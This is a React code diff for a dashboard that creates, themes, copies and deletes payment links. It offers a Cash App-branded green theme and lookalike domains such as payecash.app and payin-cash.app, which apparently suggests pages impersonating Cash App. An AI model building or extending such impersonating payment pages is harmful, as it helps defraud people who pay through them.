@@ -1,17 +1,19 @@
 import React, { useState, useEffect } from 'react';
 import axios from 'axios';
 import { CreateQrForm } from './CreateQrForm';
-import { Copy, Wallet, Users, Coins, Receipt, TrendingUp, PiggyBank, ArrowDownToLine, Link as LinkIcon } from "lucide-react";
+import { Copy, Wallet, Users, Coins, Receipt, TrendingUp, PiggyBank, ArrowDownToLine, Link as LinkIcon, QrCode, BarChart2, User, Check, Trash2 } from "lucide-react";
+import Swal from 'sweetalert2';
 
 import imgGreen from '../asset/cashapp_green.png';
 import imgLight from '../asset/cashapp_light.png';
 
 export const DashboardCards = () => {
   const [paymentLinks, setPaymentLinks] = useState([]);
-  const [selectedTheme, setSelectedTheme] = useState('light');
-  const [amount, setAmount] = useState("10");
-  const [selectedImage, setSelectedImage] = useState(imgLight); 
   const [linkIdInput, setLinkIdInput] = useState("");
+  const [amount, setAmount] = useState("10");
+
+  const [selectedDomain, setSelectedDomain] = useState("http://localhost:5173");
+  const [newLinkTheme, setNewLinkTheme] = useState('light');
 
   const [stats, setStats] = useState({
     balance: "$0.00",
@@ -29,7 +31,15 @@ export const DashboardCards = () => {
   const fetchPaymentLinks = async () => {
     try {
       const response = await axios.get('http://localhost:5000/api/payment-links');
-      setPaymentLinks(response.data);
+      const linksWithTheme = response.data.map(link => {
+        const isGreen = link.theme === 'green';
+        return {
+          ...link,
+          theme: link.theme || 'light',
+          image: isGreen ? imgGreen : imgLight
+        };
+      });
+      setPaymentLinks(linksWithTheme);
     } catch (error) {
       console.error("Error fetching payment links:", error);
     }
@@ -51,30 +61,128 @@ export const DashboardCards = () => {
     }
   };
 
+  // নির্দিষ্ট কার্ডের থিম লোকাল স্টেটে পরিবর্তন করার হ্যান্ডলার
+  const handleCardThemeChange = (id, newTheme) => {
+    setPaymentLinks(prevLinks => 
+      prevLinks.map(link => {
+        if (link._id === id) {
+          return { ...link, theme: newTheme, image: newTheme === 'green' ? imgGreen : imgLight };
+        }
+        return link;
+      })
+    );
+  };
+
+  // নতুন পেমেন্ট লিংক তৈরি করার ফাংশন (SweetAlert সহ)
   const handleCreateLink = async () => {
     if (!linkIdInput.trim()) {
-      return alert("Please enter a name for the link ID!");
+      Swal.fire({
+        icon: 'warning',
+        title: 'Required',
+        text: 'Please enter a name for the link ID!',
+        confirmButtonColor: '#00D54B',
+      });
+      return;
     }
 
-    const finalUrl = `http://localhost:5173/${linkIdInput.trim()}`;
+    const trimmedId = linkIdInput.trim();
+    const finalUrl = `${selectedDomain}/${trimmedId}`;
 
     const newLinkData = {
-      name: linkIdInput.trim(),
+      name: trimmedId,
       url: finalUrl,
-      theme: selectedTheme,
+      theme: newLinkTheme,
       amount: amount,
-      image: selectedImage, // আপনার সিলেক্ট করা imgLight বা imgGreen এখানে সেভ হবে
       createdAt: new Date()
     };
 
     try {
       const response = await axios.post('http://localhost:5000/api/create-payment-link', newLinkData);
-      setPaymentLinks([...paymentLinks, response.data]);
+      
+      const createdItem = {
+        ...response.data,
+        theme: response.data.theme || newLinkTheme,
+        image: (response.data.theme || newLinkTheme) === 'green' ? imgGreen : imgLight
+      };
+
+      setPaymentLinks([createdItem, ...paymentLinks]);
       setLinkIdInput(""); 
-      alert("Payment Link Created Successfully!");
+      
+      Swal.fire({
+        icon: 'success',
+        title: 'Success!',
+        text: 'Payment Link Created Successfully with selected theme!',
+        confirmButtonColor: '#00D54B',
+      });
     } catch (error) {
       console.error("Error creating link:", error);
-      alert("Failed to save payment link");
+      Swal.fire({
+        icon: 'error',
+        title: 'Oops...',
+        text: 'Failed to save payment link',
+        confirmButtonColor: '#00D54B',
+      });
+    }
+  };
+
+  // লিংক ডিলিট করার ফাংশন (SweetAlert Confirm সহ)
+  const handleDeleteLink = async (id) => {
+    Swal.fire({
+      title: 'Are you sure?',
+      text: "You won't be able to revert this!",
+      icon: 'warning',
+      showCancelButton: true,
+      confirmButtonColor: '#d33',
+      cancelButtonColor: '#3085d6',
+      confirmButtonText: 'Yes, delete it!'
+    }).then(async (result) => {
+      if (result.isConfirmed) {
+        try {
+          await axios.delete(`http://localhost:5000/api/payment-links/${id}`);
+          setPaymentLinks(prevLinks => prevLinks.filter(link => link._id !== id));
+          Swal.fire(
+            'Deleted!',
+            'Payment Link Deleted Successfully!',
+            'success'
+          );
+        } catch (error) {
+          console.error("Error deleting link:", error);
+          Swal.fire({
+            icon: 'error',
+            title: 'Error',
+            text: 'Failed to delete payment link',
+          });
+        }
+      }
+    });
+  };
+
+  // ডাটাবেজে কার্ডের থিম ও সেটিংস সেভ করার ফাংশন
+  const handleSaveCardSettings = async (link) => {
+    try {
+      await axios.put(`http://localhost:5000/api/payment-links/${link._id}`, {
+        theme: link.theme,
+        name: link.name,
+        url: `${selectedDomain}/${link.name}`
+      });
+      
+      Swal.fire({
+        icon: 'success',
+        title: 'Saved!',
+        text: `Theme and settings saved successfully for ${link.name}!`,
+        confirmButtonColor: '#00D54B',
+        timer: 1500,
+        showConfirmButton: false
+      });
+      
+      fetchPaymentLinks();
+    } catch (error) {
+      console.error("Error updating link settings:", error);
+      Swal.fire({
+        icon: 'error',
+        title: 'Error',
+        text: 'Failed to save settings',
+      });
     }
   };
 
@@ -82,7 +190,6 @@ export const DashboardCards = () => {
     <div className="p-8 bg-gray-50 min-h-screen">
       <h1 className="text-3xl font-bold mb-1">Dashboard</h1>
       
-      {/* স্ট্যাট কার্ডস */}
       <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-4 mb-6">
         <StatCard title="AVAILABLE BALANCE" amount={stats.balance} icon={<Wallet className="text-green-500" />} />
         <StatCard title="MY OWN EARNINGS" amount={stats.myOwnEarnings} icon={<PiggyBank className="text-green-500" />} />
@@ -97,75 +204,152 @@ export const DashboardCards = () => {
         <CreateQrForm />
 
         <div className="space-y-6">
-          <div className="flex justify-between items-center">
-            <h2 className="text-xl font-semibold">Payment Link</h2>
+          <div className="flex justify-between items-center bg-white p-4 rounded-2xl border border-gray-100 shadow-sm">
+            <h2 className="text-lg font-bold text-gray-800">Payment Link</h2>
+            <select 
+              value={selectedDomain}
+              onChange={(e) => setSelectedDomain(e.target.value)}
+              className="px-4 py-2 bg-gray-50 border border-green-500 rounded-xl text-sm font-medium text-gray-700 outline-none focus:ring-2 focus:ring-green-100 cursor-pointer shadow-sm"
+            >
+              <option value="http://localhost:5173">http://localhost:5173</option>
+              <option value="https://www.payecash.app">https://www.payecash.app</option>
+              <option value="https://www.payin-cash.app">https://www.payin-cash.app</option>
+            </select>
           </div>
 
-          {/* পেমেন্ট লিংক কার্ড লিস্ট */}
-          {paymentLinks.map((item) => (
-            <div key={item._id} className="bg-white p-4 rounded-2xl border border-gray-100 shadow-sm flex items-center justify-between gap-4">
-              <div className="flex items-center gap-3 overflow-hidden">
-                <img 
-                  src={item.image || imgLight} 
-                  alt="Logo" 
-                  className="w-10 h-10 rounded-full object-cover border flex-shrink-0 shadow-sm" 
-                />
-                <div className="truncate">
-                  <h4 className="font-bold text-gray-800 text-sm">{item.name}</h4>
-                  <p className="text-xs text-gray-400 truncate flex items-center gap-1">
-                    <LinkIcon size={12} /> {item.url}
-                  </p>
+          {paymentLinks.map((item) => {
+            const currentLinkDisplay = `${selectedDomain}/${item.name}`;
+            const isGreenTheme = item.theme === 'green';
+
+            return (
+              <div key={item._id} className="bg-white p-5 rounded-2xl border border-gray-100 shadow-sm space-y-4">
+                <div className="flex items-center justify-between gap-4">
+                  <div className="flex items-center gap-3 overflow-hidden">
+                    <div className={`w-16 h-12 rounded-xl border flex items-center justify-center p-1 shadow-sm overflow-hidden ${isGreenTheme ? 'bg-green-500' : 'bg-gray-100'}`}>
+                      <img 
+                        src={isGreenTheme ? imgGreen : imgLight} 
+                        alt="Theme Preview" 
+                        className="w-full h-full object-cover rounded-lg" 
+                      />
+                    </div>
+                    <div className="truncate">
+                      <p className="text-xs text-gray-500 truncate flex items-center gap-1 font-medium">
+                        <LinkIcon size={12} /> {currentLinkDisplay}
+                      </p>
+                    </div>
+                  </div>
+
+                  <div className="flex items-center gap-2">
+                    <button 
+                      onClick={() => { 
+                        navigator.clipboard.writeText(currentLinkDisplay); 
+                        Swal.fire({
+                          icon: 'success',
+                          title: 'Copied!',
+                          text: 'Link Copied to clipboard!',
+                          timer: 1200,
+                          showConfirmButton: false,
+                        }); 
+                      }} 
+                      className="p-2 bg-green-50 hover:bg-green-100 text-green-600 rounded-xl transition flex-shrink-0 cursor-pointer"
+                      title="Copy Link"
+                    >
+                      <Copy size={16}/>
+                    </button>
+
+                    <button 
+                      onClick={() => handleDeleteLink(item._id)} 
+                      className="p-2 bg-red-50 hover:bg-red-100 text-red-600 rounded-xl transition flex-shrink-0 cursor-pointer"
+                      title="Delete Link"
+                    >
+                      <Trash2 size={16}/>
+                    </button>
+                  </div>
+                </div>
+
+                <div className="flex items-center justify-between pt-3 border-t border-gray-100">
+                  <div>
+                    <span className="text-[10px] text-gray-400 font-bold uppercase tracking-wider block">TEMPLATE</span>
+                    <span className="text-xs font-bold text-gray-800">
+                      {isGreenTheme ? 'CashApp' : 'Default'}
+                    </span>
+                  </div>
+
+                  <div className="flex items-center gap-2">
+                    <button className="p-2 bg-gray-50 hover:bg-gray-100 text-gray-600 rounded-lg transition cursor-pointer" title="QR Code">
+                      <QrCode size={16} />
+                    </button>
+
+                    <button className="p-2 bg-gray-50 hover:bg-gray-100 text-gray-600 rounded-lg transition cursor-pointer" title="Analytics">
+                      <BarChart2 size={16} />
+                    </button>
+
+                    <button 
+                      onClick={() => handleCardThemeChange(item._id, isGreenTheme ? 'light' : 'green')}
+                      className={`px-3 py-1.5 rounded-lg text-xs font-bold transition cursor-pointer flex items-center gap-1 ${
+                        isGreenTheme 
+                          ? 'bg-green-500 text-white shadow-sm' 
+                          : 'bg-gray-900 text-white'
+                      }`}
+                      title="Toggle Theme"
+                    >
+                      {isGreenTheme ? 'CashApp' : 'Default'}
+                    </button>
+
+                    <button className="p-2 bg-gray-50 hover:bg-gray-100 text-gray-600 rounded-lg transition cursor-pointer" title="User View">
+                      <User size={16} />
+                    </button>
+
+                    <button 
+                      onClick={() => handleSaveCardSettings(item)}
+                      className="px-4 py-1.5 bg-green-500 hover:bg-green-600 text-white text-xs font-bold rounded-lg transition cursor-pointer shadow-sm flex items-center gap-1"
+                    >
+                      <Check size={14} /> Save
+                    </button>
+                  </div>
                 </div>
               </div>
+            );
+          })}
 
-              <button 
-                onClick={() => { navigator.clipboard.writeText(item.url); alert("Link Copied!"); }} 
-                className="p-2.5 bg-green-50 hover:bg-green-100 text-green-600 rounded-xl transition flex-shrink-0"
-                title="Copy Link"
-              >
-                <Copy size={16}/>
-              </button>
-            </div>
-          ))}
-
-          {/* নতুন লিঙ্ক তৈরির ফর্ম */}
           <div className="bg-white p-8 rounded-3xl border border-gray-100 shadow-lg shadow-gray-100/50 space-y-5">
             <div>
               <label className="block text-xs font-bold text-gray-800 uppercase tracking-wider mb-2">Link ID (text)</label>
               <input 
                 type="text" 
-                placeholder="e.g. ayub" 
+                placeholder="e.g. Stephanie" 
                 value={linkIdInput}
                 onChange={(e) => setLinkIdInput(e.target.value)}
                 className="w-full p-4 bg-gray-50 rounded-2xl border border-gray-200 outline-none focus:border-green-500 focus:ring-2 focus:ring-green-100 transition-all font-medium text-sm" 
               />
-              <p className="text-[11px] text-gray-400 mt-1.5">This will be your unique payment URL (e.g. http://localhost:5173/ayub).</p>
+              <p className="text-[11px] text-gray-400 mt-1.5">This will be your unique payment URL based on selected domain.</p>
             </div>
 
-            {/* লোগো সিলেকশন (এখানে দুটি PNG সিলেক্ট করা যাবে) */}
             <div>
-              <label className="block text-xs font-bold text-gray-800 uppercase tracking-wider mb-2">Select Logo</label>
+              <label className="block text-xs font-bold text-gray-800 uppercase tracking-wider mb-2">Select Initial Theme</label>
               <div className="flex gap-4">
-                <div 
-                  onClick={() => setSelectedImage(imgLight)}
-                  className={`cursor-pointer p-2 rounded-2xl border-2 transition-all ${selectedImage === imgLight ? 'border-green-500 bg-green-50/50 scale-105' : 'border-gray-200'}`}
+                <button
+                  type="button"
+                  onClick={() => setNewLinkTheme('light')}
+                  className={`flex-1 py-3 rounded-xl font-bold text-xs border-2 transition cursor-pointer ${newLinkTheme === 'light' ? 'border-green-500 bg-green-50 text-green-700' : 'border-gray-200 text-gray-600'}`}
                 >
-                  <img src={imgLight} alt="Light Logo" className="w-12 h-12 object-cover rounded-xl" />
-                </div>
-                <div 
-                  onClick={() => setSelectedImage(imgGreen)}
-                  className={`cursor-pointer p-2 rounded-2xl border-2 transition-all ${selectedImage === imgGreen ? 'border-green-500 bg-green-50/50 scale-105' : 'border-gray-200'}`}
+                  Default (Light)
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setNewLinkTheme('green')}
+                  className={`flex-1 py-3 rounded-xl font-bold text-xs border-2 transition cursor-pointer ${newLinkTheme === 'green' ? 'border-green-500 bg-green-50 text-green-700' : 'border-gray-200 text-gray-600'}`}
                 >
-                  <img src={imgGreen} alt="Green Logo" className="w-12 h-12 object-cover rounded-xl" />
-                </div>
+                  CashApp (Green)
+                </button>
               </div>
             </div>
 
             <button 
               onClick={handleCreateLink}
-              className="w-full bg-green-500 text-white py-4 rounded-2xl font-bold hover:bg-green-600 transition-all duration-300 transform hover:scale-[1.01] active:scale-95 shadow-lg shadow-green-100"
+              className="w-full bg-green-500 text-white py-4 rounded-2xl font-bold hover:bg-green-600 transition-all duration-300 transform hover:scale-[1.01] active:scale-95 shadow-lg shadow-green-100 cursor-pointer"
             >
-              Create Link
+              Create New Link
             </button>
           </div>
         </div>
